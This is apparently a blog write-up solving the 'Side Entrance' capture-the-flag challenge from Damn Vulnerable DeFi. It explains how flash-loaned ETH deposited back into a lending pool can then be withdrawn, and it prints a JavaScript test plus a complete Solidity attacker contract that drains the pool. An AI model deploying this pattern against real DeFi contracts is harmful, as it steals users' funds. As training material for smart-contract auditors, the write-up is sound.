# Conquering the Side Entrance Challenge: A Damn Vulnerable DeFi Exploit

In the world of blockchain and DeFi, understanding vulnerabilities is key to ensuring security.
The ["Side Entrance" challenge](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/) from "Damn Vulnerable DeFi" provides a perfect learning opportunity for aspiring
security enthusiasts and developers. Let's dive into the challenge and unveil a strategy to exploit this vulnerability for educational purposes.

## The Challenge Overview

"Side Entrance" is a smart contract challenge where a seemingly secure lending pool allows
for deposits, withdrawals, and flash loans. However, it hides a critical flaw in its logic,
allowing an astute hacker to drain all its funds.

## Crafting the Exploit

The exploit strategy is straightforward yet ingenious. By utilizing the contract's flash loan function,
we can deposit the borrowed funds back into the pool and subsequently withdraw them,
effectively emptying the pool's reserves.

## Implementing the Solution

Here's the Solidity code snippet [for the test](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/side-entrance/side-entrance.challenge.js) to execute the exploit:

```javascript
it('Execution', async function () {
    // Deploy the attacker contract
    const AttackerContractFactory = await ethers.getContractFactory('AttackerContract', player);
    const attacker = await AttackerContractFactory.deploy(pool.address);
    await attacker.deployed();

    // Execute the attack
    await attacker.connect(player).attack(ETHER_IN_POOL);
});
```
And here is the attacking contract:

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackerContract {
    SideEntranceLenderPool public pool;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
    }

    // Function to initiate the attack
    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    // This function is called by the SideEntranceLenderPool during the flash loan
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // Allow the contract to receive ETH
    receive() external payable {}
}

```
## Reflecting on the Challenge

This challenge is a stark reminder of the intricacies of smart contract security.
In the rapidly evolving landscape of DeFi, staying vigilant and understanding the potential
exploits is crucial for developers and auditors alike.
